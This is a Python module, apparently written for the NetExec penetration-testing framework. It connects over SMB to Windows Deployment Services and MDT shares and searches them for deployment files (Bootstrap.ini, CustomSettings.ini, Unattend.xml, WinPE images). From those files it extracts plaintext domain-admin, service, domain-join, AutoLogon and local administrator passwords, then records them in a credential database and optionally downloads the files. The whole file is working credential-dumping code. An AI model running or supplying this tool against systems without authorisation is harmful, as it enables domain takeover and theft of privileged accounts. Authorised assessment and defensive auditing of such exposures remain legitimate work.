import re
import os
from io import BytesIO
from nxc.helpers.misc import CATEGORY


CRED_KEYWORDS = [
    "DomainAdmin", "DomainAdminPassword",
    "UserID", "UserPassword",
    "JoinDomain", "DomainAdminDomain", "UserDomain",
    "MachineObjectOU",
]

# Match only the exact config filenames - avoids false positives on .vbs/.exe
SENSITIVE_REGEXES = [
    re.compile(r"bootstrap\.ini$", re.I),
    re.compile(r"customsettings\.ini$", re.I),
    re.compile(r"unattend\.xml$", re.I),
]

WIM_REGEX = re.compile(r"\.wim$", re.I)

# WinPE boot images are typically 300-600 MB; install.wim easily exceeds 5 GB.
# Anything under 1 GB is almost certainly a PE, not an OS image.
WIM_MAX_SIZE = 1 * 1024 * 1024 * 1024

# REMINST/REMOTEINSTALL: readable by any authenticated domain user by default.
WDS_SHARES_PUBLIC = {"reminst", "remoteinstall"}

# DeploymentShare$: MDT share (hidden by default, requires admin rights or misconfigured ACLs).
# If we can list it, it's either intentional access or a misconfiguration worth noting.
WDS_SHARES_AUTH = {"deploymentshare$"}


def _extract_key_values(content, keys):
    """Parse INI-style key=value pairs, handling quoted and unquoted values."""
    results = []
    text = content.replace("\r\n", "\n").replace("\r", "\n")
    for key in keys:
        patt = re.compile(
            rf'(?im)^\s*{re.escape(key)}\s*=\s*(?:"([^"]*)"|\'([^\']*)\'|([^\n]+))\s*$'
        )
        for m in patt.finditer(text):
            val = (m.group(1) or m.group(2) or m.group(3) or "").strip()
            results.append(f"{key}={val}")
    return results


def _extract_xml_credentials(content):
    """
    Extract credentials from WDS/MDT Unattend.xml structures.

    Processes each named block independently to avoid duplicates -
    flat <Username>/<Password> tags are only matched outside known nested blocks.
    """
    results = []

    # Strip known nested blocks first so flat tag matching does not produce duplicates.
    stripped = content
    for block_tag in ("AutoLogon", "Credentials", "AdministratorPassword"):
        stripped = re.sub(
            rf"<{block_tag}>.*?</{block_tag}>", "", stripped,
            flags=re.IGNORECASE | re.DOTALL
        )

    # Flat tags - safe to match now that nested blocks are removed.
    for key, patt in [
        ("Username", r"<Username>\s*([^<]+)\s*</Username>"),
        ("Password", r"<Password>\s*([^<]+)\s*</Password>"),
    ]:
        results.extend(f"{key}={val.strip()}" for val in re.findall(patt, stripped, flags=re.IGNORECASE))

    # AutoLogon block - Password nested under <Password><Value>
    m = re.search(r"<AutoLogon>(.*?)</AutoLogon>", content, flags=re.IGNORECASE | re.DOTALL)
    if m:
        block = m.group(1)
        for tag, patt in [
            ("AutoLogon.Username", r"<Username>\s*([^<]+)\s*</Username>"),
            ("AutoLogon.Password", r"<Value>\s*([^<]+)\s*</Value>"),
        ]:
            hit = re.search(patt, block, flags=re.IGNORECASE)
            if hit:
                results.append(f"{tag}={hit.group(1).strip()}")

    # Credentials block - domain join account
    m = re.search(r"<Credentials>(.*?)</Credentials>", content, flags=re.IGNORECASE | re.DOTALL)
    if m:
        block = m.group(1)
        for tag, patt in [
            ("Credentials.Domain", r"<Domain>\s*([^<]+)\s*</Domain>"),
            ("Credentials.Username", r"<Username>\s*([^<]+)\s*</Username>"),
            ("Credentials.Password", r"<Password>\s*([^<]+)\s*</Password>"),
        ]:
            hit = re.search(patt, block, flags=re.IGNORECASE)
            if hit:
                results.append(f"{tag}={hit.group(1).strip()}")

    # AdministratorPassword - always nested under <Value>
    m = re.search(
        r"<AdministratorPassword>.*?<Value>\s*([^<]+)\s*</Value>.*?</AdministratorPassword>",
        content, flags=re.IGNORECASE | re.DOTALL
    )
    if m:
        results.append(f"AdministratorPassword={m.group(1).strip()}")

    return results


def _cred_scan(content):
    """
    Best-effort credential extraction from a decoded file.
    Priority: INI key=value > XML tags > bare keyword presence (fallback).
    """
    if not content:
        return []
    if isinstance(content, (bytes, bytearray)):
        content = content.decode("utf-8", errors="ignore")
    # High null-byte density means likely binary, skip
    if content.count("\x00") > 5:
        return []

    lower = content.lower()

    kvs = _extract_key_values(content, CRED_KEYWORDS)
    if kvs:
        return kvs

    if any(tag in lower for tag in ("<username>", "<password>", "<administratorpassword>")):
        xml_hits = _extract_xml_credentials(content)
        if xml_hits:
            return xml_hits

    # Fallback: at least signal which sensitive keys are present, even without values
    return [kw for kw in CRED_KEYWORDS if kw.lower() in lower]


class NXCModule:
    """
    Detect WDS/MDT deployment shares and extract credentials from configuration files.

    Targets:
      - REMINST / REMOTEINSTALL : world-readable on any WDS server (any domain user)
      - DeploymentShare$        : MDT share, admin-only or misconfigured ACL

    Sensitive files: Bootstrap.ini, CustomSettings.ini, Unattend.xml, *.wim (WinPE only)
    Credentials are automatically extracted in-memory and pushed to the NXC database.

    Module by @archidote - https://github.com/archidote
    """

    name = "wds_mdt"
    description = r"Detect PXE WDS/MDT SMB shares (REMINST\, DeploymentShare$\) and retrieve credentials from deployment files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        DOWNLOAD  Download all found files (INI/XML + WinPE .wim < 1 GB)  (default: false)
        OUTDIR    Local folder for downloaded files                       (default: wds_mdt_loot)
        """
        self.download = module_options.get("DOWNLOAD", "false").lower() == "true"
        self.outdir = module_options.get("OUTDIR", "wds_mdt_loot")

    def on_login(self, context, connection):
        # Use impacket directly - connection.shares() triggers NXC's native
        # share enumeration output, which we want to suppress here.
        try:
            raw_shares = connection.conn.listShares()
        except Exception as e:
            context.log.debug(f"listShares() failed: {e}")
            return

        targets = []
        for share in raw_shares:
            name = share["shi1_netname"][:-1]  # strip SMB null terminator
            name_lower = name.lower()
            if name_lower in WDS_SHARES_PUBLIC:
                targets.append(name)
            elif name_lower in WDS_SHARES_AUTH:
                # Probe access silently - failure is expected on hardened configs
                try:
                    connection.conn.listPath(name, "\\*")
                    targets.append(name)
                except Exception:
                    context.log.debug(f"{name} found but not readable (expected for protected MDT share)")

        if not targets:
            context.log.debug("No WDS/REMINST share found")
            return

        for wds_share in targets:
            is_privileged = wds_share.lower() in WDS_SHARES_AUTH
            access_note = "admin access or misconfigured ACLs" if is_privileged else "standard user access"
            context.log.success(f"Found share: {wds_share} ({access_note})")

            try:
                paths = _walk_share(connection, wds_share)
            except Exception as e:
                context.log.debug(f"walk({wds_share}) failed: {e}")
                continue

            for path, file_size in paths:
                is_wim = bool(WIM_REGEX.search(path))
                size_mb = file_size / (1024 * 1024)

                if is_wim:
                    if file_size < WIM_MAX_SIZE:
                        context.log.success(f"Found WinPE image: {path} ({size_mb:.0f} MB)")
                        if self.download:
                            local = _download(context, connection, wds_share, "\\" + path, self.outdir)
                            if local:
                                context.log.success(f"Saved WinPE: {local}")
                                context.log.display(
                                    "You need to manually extract the image to try gathering credentials "
                                    "(use 7zip or wimlib-imagex)."
                                )
                    else:
                        # Oversized - almost certainly an OS install image, no credentials inside
                        context.log.display(
                            f"Found .wim: {path} - skipped (install image, {size_mb:.0f} MB, no creds here :/)"
                        )
                    continue

                context.log.debug(f"Found {path}")

                buf = BytesIO()
                try:
                    connection.conn.getFile(wds_share, "\\" + path, buf.write)
                except Exception as e:
                    context.log.debug(f"getFile({path}) failed: {e}")
                    continue

                hits = _cred_scan(_decode(buf.getvalue()))

                if hits:
                    context.log.success(f"Credentials found in {path}")
                    for hit in hits:
                        context.log.highlight(f"  {hit}")

                    # Push reconstructed credential pairs into the NXC database
                    for cred in _parse_creds(hits):
                        try:
                            context.db.add_credential(
                                "plaintext",
                                cred["domain"],
                                cred["username"],
                                cred["password"],
                            )
                            context.log.debug(
                                f"Credential added to db: {cred['domain']}\\{cred['username']}"
                            )
                        except Exception as e:
                            context.log.debug(f"db.add_credential failed: {e}")
                else:
                    context.log.debug(f"No credentials found in {path}")

                if self.download:
                    local = _download(context, connection, wds_share, "\\" + path, self.outdir)
                    if local:
                        context.log.success(f"Saved: {local}")


def _parse_creds(hits):
    """
    Reconstruct (username, password, domain) tuples from raw key=value hits.
    Handles both INI-style pairs and XML-structured blocks (AutoLogon, Credentials).
    Returns a list of dicts ready for context.db.add_credential().
    """
    kv = {}
    for hit in hits:
        if "=" in hit:
            key, _, val = hit.partition("=")
            kv[key.strip()] = val.strip()

    credentials = []

    # Domain admin account from CustomSettings.ini
    if "DomainAdmin" in kv and "DomainAdminPassword" in kv:
        credentials.append({
            "username": kv["DomainAdmin"],
            "password": kv["DomainAdminPassword"],
            "domain": kv.get("DomainAdminDomain") or kv.get("JoinDomain", ""),
        })

    # Service account from Bootstrap.ini
    if "UserID" in kv and "UserPassword" in kv:
        credentials.append({
            "username": kv["UserID"],
            "password": kv["UserPassword"],
            "domain": kv.get("UserDomain", ""),
        })

    # Domain join account from Unattend.xml Credentials block
    if "Credentials.Username" in kv and "Credentials.Password" in kv:
        credentials.append({
            "username": kv["Credentials.Username"],
            "password": kv["Credentials.Password"],
            "domain": kv.get("Credentials.Domain", ""),
        })

    # AutoLogon account from Unattend.xml
    if "AutoLogon.Username" in kv and "AutoLogon.Password" in kv:
        credentials.append({
            "username": kv["AutoLogon.Username"],
            "password": kv["AutoLogon.Password"],
            "domain": "",  # AutoLogon is typically a local account
        })

    # Local administrator password from the Unattend.xml
    if "AdministratorPassword" in kv:
        credentials.append({
            "username": "Administrator",
            "password": kv["AdministratorPassword"],
            "domain": "",
        })

    return credentials


def _walk_share(connection, share, path=""):
    """
    Recursively yield (remote_path, file_size) for sensitive files in *share*.

    Impacket quirks:
      - Root listing expects an empty string, not "/"
      - Paths use backslashes, no leading separator
      - File metadata via .get_longname(), .is_directory(), .get_filesize()
    """
    try:
        entries = connection.conn.listPath(share, (path or "") + "\\*")
    except Exception:
        return

    for entry in entries:
        name = entry.get_longname()
        if name in (".", ".."):
            continue

        full = (path + "\\" + name).lstrip("\\")

        if entry.is_directory():
            yield from _walk_share(connection, share, full)
            continue

        if any(p.search(name) for p in SENSITIVE_REGEXES) or WIM_REGEX.search(name):
            yield full, entry.get_filesize()


def _decode(raw: bytes) -> str:
    """Decode raw bytes with BOM detection and multi-encoding fallback."""
    if not raw:
        return ""
    if raw.startswith(b"\xef\xbb\xbf"):
        return raw.decode("utf-8-sig", errors="ignore")
    if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
        return raw.decode("utf-16", errors="ignore")
    if raw.count(b"\x00") > len(raw) * 0.1:
        try:
            return raw.decode("utf-16-le", errors="ignore")
        except Exception:
            pass
    for enc in ("utf-8", "latin-1"):
        try:
            return raw.decode(enc, errors="ignore")
        except Exception:
            continue
    return ""


def _download(context, connection, share, remote_path, local_dir) -> str | None:
    """Download *remote_path* from *share* and prefix the filename with the server identifier."""
    try:
        os.makedirs(local_dir, exist_ok=True)
        # Best-effort server name: NetBIOS name > hostname attribute > IP
        hostname = (
            getattr(connection, "remoteName", None)
            or getattr(connection, "hostname", None)
            or connection.host
        )
        # remote_path arrives as \Dir\file.ext - strip leading separators before splitting
        clean = remote_path.strip("\\").strip("/")
        basename = clean.replace("/", "\\").split("\\")[-1]
        local_path = os.path.join(local_dir, f"{hostname}_{basename}")
        with open(local_path, "wb") as fh:
            connection.conn.getFile(share, remote_path, fh.write)
        return local_path
    except Exception as e:
        context.log.debug(f"Download failed ({remote_path}): {e}")
        return None
